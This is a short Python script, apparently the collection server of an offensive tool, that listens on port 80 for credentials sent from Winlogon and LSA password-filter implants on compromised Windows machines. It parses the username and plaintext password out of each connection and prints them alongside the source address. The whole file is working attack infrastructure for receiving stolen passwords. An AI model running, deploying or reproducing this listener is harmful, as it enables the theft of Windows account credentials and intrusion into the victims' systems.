import socket
import threading
import argparse

print_lock = threading.Lock()


def handle_client(conn, addr):
    data = conn.recv(1024)
    strData = str(data)
    #print(strData) #debugging
    if '@@' in strData: #winlogon
        type = 'WinLogon'
        username = strData[2:strData.find('@@')]
    else:
        type = 'Password Change'
        username = strData[2:strData.find(':')]
    password = strData[strData.find(':')+1:strData.find(';end')]
    print(f"\nSource: {addr}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n")
    if not data:
        print_lock.release()


def main():
    print("""\                                                                                                                     
  _____            ____  _____   ______         _____   ____  ____      _________________      ______        _____   
 |\    \   _____  |    ||\    \ |\     \   ____|\    \ |    ||    |    /                 \ ___|\     \   ___|\    \  
 | |    | /    /| |    | \\    \| \     \ |    | \    \|    ||    |    \______     ______/|     \     \ |    |\    \ 
 \/     / |    || |    |  \|    \  \     ||    |______/|    ||    |       \( /    /  )/   |     ,_____/||    | |    |
 /     /_  \   \/ |    |   |     \  |    ||    |----'\ |    ||    |  ____  ' |   |   '    |     \--'\_|/|    |/____/ 
|     // \  \   \ |    |   |      \ |    ||    |_____/ |    ||    | |    |   |   |        |     /___/|  |    |\    \ 
|    |/   \ |    ||    |   |    |\ \|    ||    |       |    ||    | |    |  /   //        |     \____|\ |    | |    |
|\ ___/\   \|   /||____|   |____||\_____/||____|       |____||____|/____/| /___//         |____ '     /||____| |____|
| |   | \______/ ||    |   |    |/ \|   |||    |       |    ||    |     |||`   |          |    /_____/ ||    | |    |
 \|___|/\ |    | ||____|   |____|   |___|/|____|       |____||____|_____|/|____|          |____|     | /|____| |____|
    \(   \|____|/   \(       \(       )/    )/           \(    \(    )/     \(              \( |_____|/   \(     )/  
     '      )/       '        '       '     '             '     '    '       '               '    )/       '     '   
            '                                                                                     '                  

""")
    parser = argparse.ArgumentParser(description="Receive creds from Winlogon + LSA Filters")
    parser.add_argument('--ip', type=str, nargs='?', const=1, help="IP to listen on (default: 0.0.0.0)", default='0.0.0.0')
    parser.add_argument('--port', type=int, nargs='?', const=1, help="Port to listen on (default: 80)", default=80)
    args = parser.parse_args()

    s = socket.socket() 
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(f"Listening on {args.ip}:{args.port}\n")
    s.bind((args.ip, args.port)) 
    s.listen(100) 

    while True:
        conn, addr = s.accept() 
        t = threading.Thread(target=handle_client, args=(conn, addr))
        t.start()


main()